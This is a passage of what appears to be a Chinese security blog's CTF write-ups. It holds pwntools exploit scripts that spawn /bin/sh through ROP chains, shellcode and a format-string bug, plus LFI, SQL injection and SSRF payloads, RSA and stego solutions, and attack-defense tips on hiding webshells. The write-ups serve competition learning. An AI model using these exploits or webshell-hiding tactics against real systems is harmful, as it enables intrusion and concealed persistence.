process(<span class=\"string\">\"./baby_stack\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./baby_stack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rop = roputils.ROP(<span class=\"string\">'./baby_stack'</span>)</span><br><span class=\"line\">stage = rop.section(<span class=\"string\">'.bss'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x4c</span></span><br><span class=\"line\">vulFunc = <span class=\"number\">0x804840b</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf1 = <span class=\"string\">'A'</span> * offset</span><br><span class=\"line\">buf1 += p32(elf.symbols[<span class=\"string\">'read'</span>]) + p32(vulFunc) + p32(<span class=\"number\">0</span>) + p32(stage) + p32(<span class=\"number\">100</span>)</span><br><span class=\"line\">p.send(buf1)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = rop.string(<span class=\"string\">'/bin/sh'</span>)</span><br><span class=\"line\">buf2 += rop.fill(<span class=\"number\">20</span>, buf2)</span><br><span class=\"line\">buf2 += rop.dl_resolve_data(stage+<span class=\"number\">20</span>, <span class=\"string\">'system'</span>)</span><br><span class=\"line\">buf2 += rop.fill(<span class=\"number\">100</span>, buf2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(buf2)</span><br><span class=\"line\"></span><br><span class=\"line\">buf3 = <span class=\"string\">\"A\"</span>*offset + rop.dl_resolve_call(stage+<span class=\"number\">20</span>,stage)</span><br><span class=\"line\">p.send(buf3)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>dragon_game</strong></li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = 'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./DragonGame\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"secret[0] is \"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = int(p.recvuntil(<span class=\"string\">\"\\n\"</span>)[:<span class=\"number\">-1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">\"addr:\"</span>+hex(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"west?:\\n\"</span>,<span class=\"string\">\"east\"</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"address'\\n\"</span>,str(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\" is:\\n\"</span>,<span class=\"string\">\"%233c%7$n\"</span>)   <span class=\"comment\">#修改check[0]=233</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\"</span>        <span class=\"comment\">#Linux/x64 Execute /bin/sh Shellcode</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"SPELL\\n\"</span>, shellcode)   </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>easy_rop</strong></li>\n<li>通过__libc_csu_init()函数来构造gadgets</li>\n<li>通过设置eax为59调用execve(‘/bin/sh’,NULL,NULL)</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./easy_rop\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./easy_rop\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">syscall_addr = <span class=\"number\">0x400582</span></span><br><span class=\"line\">rop_addr1 = <span class=\"number\">0x4005fa</span>            <span class=\"comment\">#&lt;__libc_csu_init+90&gt;</span></span><br><span class=\"line\">rop_addr2 = <span class=\"number\">0x4005e0</span>            <span class=\"comment\">#&lt;__libc_csu_init+64&gt;</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x601040</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x18</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#在bss段写入/bin/sh和syscall的地址</span></span><br><span class=\"line\">rop = <span class=\"string\">\"\"</span></span><br><span class=\"line\">rop += offset*<span class=\"string\">\"A\"</span></span><br><span class=\"line\">rop += p64(rop_addr1)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)                   <span class=\"comment\">#rbx</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">1</span>)                   <span class=\"comment\">#rbp</span></span><br><span class=\"line\">rop += p64(elf.got[<span class=\"string\">'read'</span>])     <span class=\"comment\">#r12</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0x20</span>)                <span class=\"comment\">#r13    #rdx</span></span><br><span class=\"line\">rop += p64(bss_addr)            <span class=\"comment\">#r14    #rsi</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)                   <span class=\"comment\">#r15    #rdi</span></span><br><span class=\"line\">rop += p64(rop_addr2)           <span class=\"comment\">#ret    #read(0, bss_addr, 0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#设置eax为59</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)                   <span class=\"comment\">#rbx</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">1</span>)                   <span class=\"comment\">#rbp</span></span><br><span class=\"line\">rop += p64(elf.got[<span class=\"string\">'read'</span>])     <span class=\"comment\">#r12</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0x40</span>)                <span class=\"comment\">#r13    #rdx</span></span><br><span class=\"line\">rop += p64(bss_addr+ <span class=\"number\">0x10</span>)      <span class=\"comment\">#r14    #rsi</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0x0</span>)                 <span class=\"comment\">#r15    #rdi</span></span><br><span class=\"line\">rop += p64(rop_addr2)           <span class=\"comment\">#ret    #read(0, bss_addr+0x10, 0x40)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#execve('/bin/sh', NULL, NULL)</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop += p64(bss_addr + <span class=\"number\">8</span>)        <span class=\"comment\">#syscall</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)                   <span class=\"comment\">#NULL</span></span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)                   <span class=\"comment\">#NULL</span></span><br><span class=\"line\">rop += p64(bss_addr)            <span class=\"comment\">#'/bin/sh'</span></span><br><span class=\"line\">rop += p64(rop_addr2)           <span class=\"comment\">#execve('/bin/sh', NULL, NULL)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第一次read</span></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send((<span class=\"string\">\"/bin/sh\\x00\"</span>+p64(syscall_addr)).ljust(<span class=\"number\">0x20</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第二次read</span></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"A\"</span>*<span class=\"number\">59</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>login</strong></li>\n<li>存在整数溢出，passwd可以输入409长度，当输入大于260长度时也可符合判定，跳到特定函数即可拿flag</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./login\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"choice:\"</span>,<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"username:\\n\"</span>,<span class=\"string\">\"\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">24</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"A\"</span>*offset</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804868b</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">261</span>,<span class=\"string\">\"A\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"passwd:\\n\"</span>,payload)</span><br><span class=\"line\"><span class=\"keyword\">print</span> p.recvall()</span><br></pre></td></tr></table></figure>\n","categories":["比赛"],"tags":["CTF","比赛"]},{"title":"首届新疆网络安全知识技能竞赛(个人赛)","url":"https://www.xjseck.com/2018/09/12/首届新疆网络安全知识技能竞赛(个人赛)/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>这次比赛也算是一个疆内CTF比赛的一个摸底，将会今后疆内比赛发展的一个趋势，此次参加比赛的团体有来自全国各地的64个团体、137名个人，共329名选手参赛。为期三天的比赛，也算是走过了全程，前两天的个人和团体的刷题晋级赛和第三天的个人和团体的攻防赛，我带的两个队伍双双都挺进了决赛，最后选择两个人决赛和两个队伍的团体决赛的模式，完成了此次比赛。之前也是立了一个FLAG，就是疆内的比赛我们绝对要拼尽全力，也必须在疆内的高校队伍中排上前两名，这次也算是完成了这个flag，最终挺进决赛的高校队伍也就只剩下新疆师范大学-大象安全和大象与安全队伍了。为了这次比赛我们做了一个赛后的详细的复盘，包括攻防赛。</p>\n<h2 id=\"个人刷题晋级赛\"><a href=\"#个人刷题晋级赛\" class=\"headerlink\" title=\"个人刷题晋级赛\"></a>个人刷题晋级赛</h2><p>个人赛期间比较蛇皮，状态什么的没有调整好，赛前 还给别人进行培训，结果参赛时，什么都不会，一些客观原因，导致比赛也不是很顺利，搞了两个选手的shell，导致很蛇皮。这里就复盘隐写、密码和web题目<br><img src=\"wang1.png\" alt=\"\"><br><img src=\"xuanshou.png\" alt=\"\"></p>\n<h3 id=\"misc题解\"><a href=\"#misc题解\" class=\"headerlink\" title=\"misc题解\"></a>misc题解</h3><ul>\n<li><p><strong>躲猫猫</strong><br>拿到题目，发现是png文件，但是不行正常浏览图片，查看属性发现1M多，应该是包含了其他内容，使用binwalk发现，发现文件是从pdf文件格式开始的，我们可以尝试修改文件的后缀名为PDF（一般文件预浏览的话都是从文件内容格式的最开始的文件格式进行的），可以正常浏览，然后ctrl+a全选是否有隐藏的文字<br><img src=\"maomao.png\" alt=\"\"><br><img src=\"maomao1.png\" alt=\"\"><br><strong>坑点</strong> 使用foremost 等工具解压出来的文件，也会有一个pdf，但是ctrl+a发现是一个假的flag<br><img src=\"maomao2.png\" alt=\"\"></p>\n</li>\n<li><p><strong>第8号</strong><br>常规的过一遍stegsolve和binwalk没有发现什么问题，那就手动浏览一下十六进制，图片是jpeg，一ff 8d 开始，应该是ff 9d 结束，发现后面隐藏的有数据信息，foremost 也没提取到什么信息，就手动提取一下十六进制，导出文件。<br><img src=\"8.png\" alt=\"\"><br>应该是“当铺密码”</p>\n</li>\n</ul>\n<p><img src=\"8-1.png\" alt=\"\"><br>然后我们把 大量出现的数字46、63、33转字符<br><img src=\"8-11.png\" alt=\"\"><br>搜索一下 发现时0ok！解密<br><a href=\"https://www.splitbrain.org/services/ook\" target=\"_blank\" rel=\"noopener\">https://www.splitbrain.org/services/ook</a><br>flag{0ok_1_Ook}</p>\n<ul>\n<li><strong>task_give_you_flag</strong></li>\n</ul>\n<p>一个gif文件，使用stegsolve浏览每一帧的图片信息，最后一帧出现一个二维码的图片，发现缺3个角，那就找一个完整的二维码，补一下角。<br><img src=\"flag.png\" alt=\"\"></p>\n<ul>\n<li><strong>流量包解密01</strong><br>直接使用<br>aircrack-ng 爆破，发现在跑IV，说明就是wpe加密的握手包，密码为<code>[ 42:43:31:33:46 ] (ASCII: BC13F )</code> 直接wireshark进行解密<br><img src=\"cap1.png\" alt=\"\"><br>浏览一下 http 协议<br>最后发现<br><img src=\"cap2.png\" alt=\"\"><br><img src=\"cap3.png\" alt=\"\"><br><strong>妈耶</strong>最后发现，这个不是就是国赛出题的师傅吗，当时还私聊进行过交流，结果还是败给师傅了。:)太强了</li>\n</ul>\n<h3 id=\"Web题解\"><a href=\"#Web题解\" class=\"headerlink\" title=\"Web题解\"></a>Web题解</h3><ul>\n<li><strong>LFI</strong><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    $file = <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'file'</span>]) ? $_GET[<span class=\"string\">'file'</span>] : <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(stripos($file, <span class=\"string\">'flag.php'</span>) !== <span class=\"keyword\">false</span> &amp;&amp; stripos($file, <span class=\"string\">'base64'</span>) === <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'flag.php 中有你想要的'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>stripos函数是二进制安全目前没有办法绕过，只能考虑替换base64功能的过滤器进行文件的编码读取<br>参考<code>https://lorexxar.cn/2016/09/14/php-wei/</code><br>最后payload ：<code>file=php://filter/read=string.rot13/resource=flag.php</code></p>\n<ul>\n<li><strong>ezsqli</strong><br>手工测试，发现是回现注入，过滤的关键字比较多，大概测试了，过滤了information和flag字段，这样就卡死了不能使用union select from通过mysql的内置数据库查询数据了，<br>手工大致猜测了一下数据库和表和字段<br><code>http://10.98.98.25:5551/index.php?id=-1&#39; union select 1,database(),3 || &#39;1&#39;=&#39;1</code><br>ctf  数据库  info 表 字段 phone  username password  email<br>感觉有点类似ddctf的过滤字段名的注入<br>最后本地测试了一下<br>源表中的数据<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+<span class=\"comment\">----+----------+------------+---------------------+</span></span><br><span class=\"line\">| id | username | password   | flag                |</span><br><span class=\"line\">+<span class=\"comment\">----+----------+------------+---------------------+</span></span><br><span class=\"line\">|  1 | Dumb     | Dumb       | NULL                |</span><br><span class=\"line\">|  2 | Angelina | I-<span class=\"keyword\">kill</span>-you | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">3</span> | Dummy    | p@ssword   | xjnu&#123;ctf-<span class=\"keyword\">is</span>-there!&#125; |</span><br><span class=\"line\">|  <span class=\"number\">4</span> | secure   | crappy     | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">5</span> | stupid   | stupidity  | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">6</span> | superman | genious    | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">7</span> | batman   | mob!le     | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">8</span> | <span class=\"keyword\">admin</span>    | <span class=\"number\">2122</span>       | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">|  <span class=\"number\">9</span> | <span class=\"number\">0</span>        | <span class=\"number\">0</span>          | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">| <span class=\"number\">10</span> | seck     | <span class=\"keyword\">test</span>       | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">| <span class=\"number\">11</span> | seck     | <span class=\"keyword\">test</span>       | <span class=\"literal\">NULL</span>                |</span><br><span class=\"line\">| <span class=\"number\">20</span> | <span class=\"number\">114</span>      | <span class=\"number\">123456</span>     | <span class=\"number\">2332</span>                |</span><br><span class=\"line\">| <span class=\"number\">21</span> | <span class=\"number\">0</span>        | <span class=\"number\">123456</span>     | <span class=\"number\">2332</span>                |</span><br><span class=\"line\">| <span class=\"number\">22</span> | <span class=\"number\">1</span>        | <span class=\"number\">123456</span>     | <span class=\"number\">2332</span>                |</span><br><span class=\"line\">+<span class=\"comment\">----+----------+------------+---------------------+</span></span><br><span class=\"line\"><span class=\"number\">14</span> <span class=\"keyword\">rows</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"ezsql.png\" alt=\"\"></p>\n<ul>\n<li><p><strong>Curl</strong><br>访问题目出现一个输入框，随便填上一些地址，发现有waf，当时测试发现是ip的10进制可以进行访问，然后爆破了一波端口，发现就3306端口开着，一直没有办法，考点应该是通过伪协议进行文件的读取，但是发现file、http、等协议被过滤，当时没有想到是绕过这两个关键字，赛后才知道是file协议的大写绕过，直接读flag文件:<br>payload:<code>curl=FILE:///flag</code></p>\n</li>\n<li><p><strong>sha1</strong><br>这个很常见的php的一些加密函数不能处理数组，如md5、sha1</p>\n</li>\n</ul>\n<h2 id=\"密码题\"><a href=\"#密码题\" class=\"headerlink\" title=\"密码题\"></a>密码题</h2><ul>\n<li><p><strong>mystical_sign</strong><br><code>c2p9eWJfZ25hbHZ0X2Jfe2xoZ2JuX3JsdA==</code><br>解密出来<br><code>sj}yb_gnalvt_b_{lhgbn_rlt</code> 看起来比较想栅栏加密，然后进行 栅栏解密<br><a href=\"http://ctf.ssleye.com/railfence.html\" target=\"_blank\" rel=\"noopener\">http://ctf.ssleye.com/railfence.html</a><br><img src=\"sanlan.png\" alt=\"\"><br><code>synt{blnl_abj_lbh_trg_vg}</code><br>然后进行凯撒偏移<br><code>flag{oyay_now_you_get_it}</code><br>这道题应该和sctf的签到题差不多。</p>\n</li>\n<li><p><strong>task_simple_RSA</strong></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">小明得到了一个RSA加密信息，你能帮他解开吗？</span><br><span class=\"line\"></span><br><span class=\"line\">c=27990707239527629138352696377606718299992092729307910015562504696905353450041</span><br><span class=\"line\"></span><br><span class=\"line\">n=41069065654959614597750207738698085798765257876378561837894254544512565197793</span><br><span class=\"line\"></span><br><span class=\"line\">e=11</span><br></pre></td></tr></table></figure>\n<p>题目直接给了n、c、e，那我们可以对n进行分解出p和q<br><code>p = 218538667198531171522213512860093810267 q = 187925853952657607512617865502535480179</code><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\">n = <span class=\"number\">41069065654959614597750207738698085798765257876378561837894254544512565197793</span></span><br><span class=\"line\">c = <span class=\"number\">27990707239527629138352696377606718299992092729307910015562504696905353450041</span></span><br><span class=\"line\">e = long(<span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">218538667198531171522213512860093810267</span></span><br><span class=\"line\">q = <span class=\"number\">187925853952657607512617865502535480179</span></span><br><span class=\"line\"></span><br><span class=\"line\">d = long(gmpy.invert(e,(p<span class=\"number\">-1</span>)*(q<span class=\"number\">-1</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">key = RSA.construct((n,e,d))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> key.decrypt(c)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(key.decrypt(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(key.decrypt(c))[<span class=\"number\">2</span>:<span class=\"number\">-1</span>].decode(<span class=\"string\">'hex'</span>)</span><br></pre></td></tr></table></figure></p>\n<p>flag为：<code>ABCEF!th1s_was_very_hot_outside!</code></p>\n","categories":["比赛"],"tags":["CTF","攻防"]},{"title":"从头开始SRC漏洞挖掘","url":"https://www.xjseck.com/2018/07/16/从头开始SRC漏洞挖掘/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>这段时间学习的东西比较积淀，想构造自己批量检测漏洞的工具，也是怕自己积攒的漏洞姿势不够，所以就疯狂的开始整理漏洞的利用方式。大致从Top10漏洞和常见的应用漏洞整理开始。<br><strong>大致整理</strong></p>\n<ul>\n<li>SRC案例学习，主要参考web-hacking-101、论坛Paper和一些Wooyun案例</li>\n<li>分析一下各个挖洞大佬们提交的漏洞情况，一般有批量的嫌疑，但是最多的还是细节+手工</li>\n<li>漏洞复现，积攒漏洞量和自己的敏感性</li>\n<li>渗透测试经验补充和CTF刷题</li>\n</ul>\n<h2 id=\"立一个FLag\"><a href=\"#立一个FLag\" class=\"headerlink\" title=\"立一个FLag\"></a>立一个FLag</h2><ul>\n<li>争取完善一下Top10的漏洞利用姿势</li>\n<li>渗透测试Bypass姿势提升</li>\n<li>批量脚本的编写和自动化的实现</li>\n</ul>\n","categories":["SRC"],"tags":["SRC","漏洞"]},{"title":"6月9新警-易霖博杯网络安全技能大赛","url":"https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","content":"<h2 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h2><p>  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此<br>行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目也积累了相对比较多，这一方面有感兴趣的小伙伴可以私下交流一下，具体的题目资源和本学校的信息安全协会都会有相应的介绍，关于CTF比赛WEB解题的模式，可以参考github上面的内容 <a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a>最后贴上几个图片吧。</p>\n<p><img src=\"ctfwp.png\" alt=\"图片描述\"><br><img src=\"6.png\" alt=\"图片描述\"><br><img src=\"66.png\" alt=\"图片描述\"></p>\n<h2 id=\"题目wp\"><a href=\"#题目wp\" class=\"headerlink\" title=\"题目wp\"></a>题目wp</h2><ol>\n<li>首先拿到题目，就比较懵逼，这比赛的感觉就不吐槽了，上来就是web版的ssh 才可以使用，只能一个人进行操作。</li>\n<li>两个Web服务器，配搭着各种服务和漏洞。server1  root用户，web目录文件也是root，所以这个很蛇皮。Server2 admin用户，Web 目录文件也是admin组，这个还可以，文件权限都是777。</li>\n<li>根据以往比赛经验来看，大致的思路我这里贴一下，后面再介绍此次比赛所用到的姿势。</li>\n</ol>\n<blockquote>\n<p>1、备份。源码以及数据库，可以备份到隐蔽的目录（.xx）下，顺便down到本地（Win下：Winscp，FileZilla；Mac：scp，Transmit..）；<br>2、扫描后门。有的比赛主办方留有后门，利用安全狗、D盾这类软件来扫描源码，快速定位并利用；或者利用seay的代码审计工具也可快速扫描到后门；<br>3、弱口令。绝大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，快速修改自己密码（无关紧要的可直接mv来改名）并利用；<br>4、自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用；<br>5、监测文件上传时间可快速发现他人shell，并加以利用。我们上传的shell也可以修改文件时间来加强混淆，touch -r 目的 源；<br>6、不要想办法提权，费时费力不讨好，给root的主办方都是假的；<br>7、开一台ssh只做一件事，tail -f *.log，看日志，不言而喻，抓他们的payload并利用；<br>8、CMS补漏洞没必要按着网上的一步一步修改源码来改，如果是一些无关紧要的功能，直接mv改名，大多数主办方只是check服务是否能正常运行；<br>9、shell使用外部接受参数进行命令调用，多POST；<br>10、权限维持很多方法，如果被种上都很恶心，不过如果挂上waf（禁止文件上传，执行任何命令均返回假flag，发现敏感字段直接exit [过滤都是假的]，…）这些都是浮云，手速还是最重要的；<br>11、为了避免自己上传的shell都一样而被别人利用于其他服务器，可以采用md5等hash来命名文件名（避免，太扎眼）或者密码；<br>12、如果被挂上内存马，并且没有权限来restart apache2下，完全可以直接在shell中（www-data 